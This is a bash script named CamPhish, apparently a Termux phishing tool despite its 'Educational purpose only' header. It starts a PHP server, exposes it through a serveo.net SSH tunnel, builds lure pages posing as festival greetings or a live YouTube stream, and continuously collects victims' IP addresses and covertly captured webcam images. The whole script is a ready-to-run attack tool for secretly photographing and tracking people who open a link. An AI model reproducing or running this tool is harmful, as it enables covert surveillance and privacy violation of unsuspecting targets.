#!/bin/bash
# CamPhish v2.1 - Termux optimized + fast image capture
# Educational purpose only

trap 'printf "\n"; stop' 2

banner() {
    clear
    echo -e "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m"
    echo -e "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m"
    echo -e "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m"
    echo -e "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m"
    echo -e "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m"
    echo -e "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m"
    echo -e "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m"
    echo -e "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m"
    echo -e "\n\e[1;77m         Fast Capture Edition - Monitor every 0.3 sec\e[0m\n"
}

stop() {
    pkill -f ngrok 2>/dev/null
    pkill -f php 2>/dev/null
    pkill -f ssh 2>/dev/null
    exit 1
}

get_serveo_link() {
    local attempt=0
    local max_attempts=12
    local link=""
    while [ $attempt -lt $max_attempts ]; do
        link=$(grep -oE 'https://[a-zA-Z0-9-]+\.(serveo\.net|serveousercontent\.com)' sendlink 2>/dev/null | head -1)
        if [ -n "$link" ]; then
            echo "$link"
            return 0
        fi
        link=$(grep -o 'https://[^ ]*' sendlink 2>/dev/null | head -1)
        if [ -n "$link" ]; then
            echo "$link"
            return 0
        fi
        sleep 1
        ((attempt++))
    done
    return 1
}

serveo_tunnel() {
    command -v ssh >/dev/null 2>&1 || { echo "ssh not installed"; exit 1; }
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo tunnel...\e[0m"
    rm -f sendlink
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    SSH_PID=$!
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for tunnel (10 sec)...\e[0m"
    sleep 10
    LINK=$(get_serveo_link)
    if [ -z "$LINK" ]; then
        echo -e "\e[1;91m[!] Failed to get link from Serveo.\e[0m"
        kill $SSH_PID 2>/dev/null
        exit 1
    fi
    echo -e "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m \e[1;97m$LINK\e[0m"
    echo "$LINK" > current_link.txt
}

start_php_server() {
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server on port 3333...\e[0m"
    # Termux fix: kill process using port 3333
    pid=$(lsof -ti:3333 2>/dev/null)
    [ -n "$pid" ] && kill -9 $pid 2>/dev/null
    pkill -f "php -S localhost:3333" 2>/dev/null
    php -S localhost:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    if ! kill -0 $PHP_PID 2>/dev/null; then
        echo -e "\e[1;91m[!] PHP server failed. Check PHP installation.\e[0m"
        exit 1
    fi
    echo -e "\e[1;92m[+] PHP server running on port 3333\e[0m"
}

build_payload() {
    local link="$1"
    sed "s+forwarding_link+$link+g" template.php > index.php
    if [ "$option_tem" -eq 1 ]; then
        sed "s+forwarding_link+$link+g" festivalwishes.html > index3.html
        sed "s+fes_name+$fest_name+g" index3.html > index2.html
    else
        sed "s+forwarding_link+$link+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+$yt_video_ID+g" index3.html > index2.html
    fi
    rm -f index3.html
    echo -e "\e[1;92m[+] Payload built. Waiting for targets...\e[0m"
}

monitor_captures() {
    mkdir -p captured_images
    echo -e "\e[1;93m[*] Monitoring fast captures (every 0.2s). Press Ctrl+C to stop.\e[0m\n"
    while true; do
        # Capture IPs
        if [ -f "ip.txt" ]; then
            IP=$(grep -a 'IP:' ip.txt | cut -d ' ' -f2 | tr -d '\r')
            echo -e "\e[1;92m[+] New IP captured:\e[0m \e[1;77m$IP\e[0m"
            cat ip.txt >> saved_ips.txt
            rm -f ip.txt
        fi
        # Capture images from cam*.png (saved by post.php)
        for img in cam*.png; do
            if [ -f "$img" ]; then
                newname="captured_images/$(date +"%Y%m%d_%H%M%S_%N")_$img"
                mv "$img" "$newname"
                echo -e "\e[1;92m[+] Fast image saved:\e[0m $newname"
            fi
            break
        done
        # Fallback: Log.log
        if [ -f "Log.log" ]; then
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            mv Log.log "captured_images/capture_$TIMESTAMP.log"
            echo -e "\e[1;92m[+] Log image saved: captured_images/capture_$TIMESTAMP.log\e[0m"
        fi
        sleep 0.2
    done
}

select_template() {
    echo -e "\n----- Choose a template -----"
    echo -e "\e[1;92m[01]\e[0m Festival Wishing"
    echo -e "\e[1;92m[02]\e[0m Live Youtube TV"
    read -p $'\n\e[1;92m[+] Choose template [1-2]: \e[0m' option_tem
    case $option_tem in
        1)
            read -p $'\e[1;92m[+] Enter festival name: \e[0m' fest_name
            fest_name="${fest_name// /}"
            ;;
        2)
            read -p $'\e[1;92m[+] Enter YouTube video ID: \e[0m' yt_video_ID
            ;;
        *)
            echo "Invalid, using default (1)"
            option_tem=1
            fest_name="HappyBirthday"
            ;;
    esac
}

main() {
    banner
    select_template
    rm -rf captured_images capture_*.log saved_ips.txt ip.txt Log.log current_link.txt sendlink cam*.png
    start_php_server
    serveo_tunnel
    LINK=$(cat current_link.txt)
    build_payload "$LINK"
    monitor_captures
}

main
